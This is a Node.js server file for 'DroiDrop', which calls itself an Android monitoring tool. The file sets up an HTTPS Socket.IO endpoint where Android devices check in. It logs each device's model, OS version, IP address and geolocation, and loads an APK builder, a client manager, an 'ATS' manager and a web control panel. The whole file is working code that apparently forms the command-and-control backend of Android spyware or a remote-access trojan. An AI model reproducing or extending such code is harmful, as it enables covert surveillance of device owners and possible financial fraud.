/*
 * DroiDrop
 * An Android Monitoring Tool
 * By VoidTyphoon.co.uk
 */

const express = require("express"),
  app = express(),
  IO = require("socket.io"),
  geoip = require("geoip-lite"),
  fs = require("fs"),
  https = require("https"),
  cookieParser = require("cookie-parser"),
  CONST = require("./includes/const"),
  db = require("./includes/databaseGateway"),
  logManager = require("./includes/logManager"),
  clientManager = new (require("./includes/clientManager"))(db),
  atsManager = new (require("./includes/atsManager"))(db),
  apkBuilder = require("./includes/apkBuilder");

// ==================== HTTPS CONFIGURATION ====================
const options = {
  key: fs.readFileSync("./localhost+2-key.pem"),
  cert: fs.readFileSync("./localhost+2.pem"),
};

const httpsServer = https.createServer(options);

// ==================== SOCKET.IO SOBRE HTTPS ====================
let client_io = IO(httpsServer, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"],
  },
});

client_io.sockets.pingInterval = 30000;

client_io.on("connection", (socket) => {
  socket.emit("welcome");

  let clientParams = socket.handshake.query;
  let clientAddress = socket.request.connection;
  let clientIP = clientAddress.remoteAddress.substring(
    clientAddress.remoteAddress.lastIndexOf(":") + 1,
  );
  let clientGeo = geoip.lookup(clientIP);
  if (!clientGeo) clientGeo = {};

  clientManager.clientConnect(socket, clientParams.id, {
    clientIP,
    clientGeo,
    device: {
      model: clientParams.model,
      manufacture: clientParams.manf,
      version: clientParams.release,
    },
  });

  if (CONST.debug) {
    var onevent = socket.onevent;
    socket.onevent = function (packet) {
      var args = packet.data || [];
      onevent.call(this, packet);
      packet.data = ["*"].concat(args);
      onevent.call(this, packet);
    };
    socket.on("*", function (event, data) {
      console.log(event);
      console.log(data);
    });
  }
});

// Inicia servidor HTTPS
httpsServer.listen(CONST.control_port, () => {
  console.log(`[HTTPS] Socket.IO rodando na porta ${CONST.control_port}`);
});

// ==================== CONFIGURAÇÃO DO EXPRESS ====================
app.disable("x-powered-by");
app.set("trust proxy", 1);
app.set("view engine", "ejs");
app.set("views", __dirname + "/assets/views");
app.use(express.static(__dirname + "/assets/webpublic"));
app.use(cookieParser());

// **IMPORTANTE**: Define o app global ANTES de carregar as rotas
global.app = app;
global.CONST = CONST;
global.db = db;
global.logManager = logManager;
global.clientManager = clientManager;
global.atsManager = atsManager;
global.apkBuilder = apkBuilder;

// Carrega as rotas depois de definir o global.app
app.use(require("./includes/expressRoutes"));

// ==================== SERVIDOR WEB EM HTTPS ====================
const webHttpsServer = https.createServer(options, app);

webHttpsServer.listen(CONST.web_port, () => {
  console.log(`[HTTPS] Interface rodando na porta ${CONST.web_port}`);
});
